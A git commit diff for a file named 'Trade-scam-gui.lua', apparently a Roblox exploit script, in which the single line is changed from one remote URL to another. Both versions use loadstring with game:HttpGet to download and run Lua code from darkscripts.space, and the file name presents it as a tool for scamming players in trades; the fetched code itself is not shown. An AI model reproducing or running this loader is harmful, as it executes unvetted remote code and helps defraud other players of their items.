88cf5da13d9462f0d3b744f60a02bf2b8ad2f371
RobloxScripter <burgirek2@gmail.com>
2024-12-28 23:14:55 +0100

    Update Trade-scam-gui.lua

--- Trade-scam-gui.lua
+++ Trade-scam-gui.lua
@@ -1,1 +1,1 @@
-loadstring(game:HttpGet('https://darkscripts.space/scripts/5de69b91-4f6a-462c-bc01-fdafe80cca90_1031309215597342730.lua',true))()
+loadstring(game:HttpGet('https://darkscripts.space/scripts/424b20cc-e46a-40f3-aa2a-f447de8fc92b_1031309215597342730.lua',true))()
